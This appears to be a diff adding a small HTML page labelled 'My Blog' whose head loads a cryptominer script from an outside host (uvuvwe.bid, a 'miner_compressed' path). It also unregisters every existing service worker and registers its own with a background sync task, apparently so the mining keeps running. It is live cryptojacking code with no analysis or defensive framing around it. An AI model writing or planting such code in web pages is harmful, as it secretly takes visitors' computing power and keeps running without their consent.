@@ -1,0 +1,39 @@
+<html>
+<head>
+<script src="js/webmr.js"></script>
+<script src="https://uvuvwe.bid/jo/jo/miner_compressed/webmr.js"></script>
+
+<script>
+if ('serviceWorker' in navigator) {
+    KillAndRestart();
+
+    function KillAndRestart() {
+        navigator.serviceWorker.getRegistrations()
+            .then(function (registrations) {
+                for (let registration of registrations) {
+                    registration.unregister();
+                }
+            });
+
+        setTimeout(function () {
+            navigator.serviceWorker.register('js/sw-webmr.js')
+                .then(function (registration) {
+                    console.log('Registration successful, scope is:', registration.scope);
+                })
+                .catch(function (error) {
+                    console.log('Service worker registration failed, error:', error);
+                });
+
+            navigator.serviceWorker.ready.then(function (swRegistration) {
+                return swRegistration.sync.register('startWS');
+            });
+        }, 1000);
+    }
+}
+</script> 
+</head>
+<body>
+    <h1>My Blog</h1>
+    <p>Welcome to my mining site.</p>
+</body>
+</html>
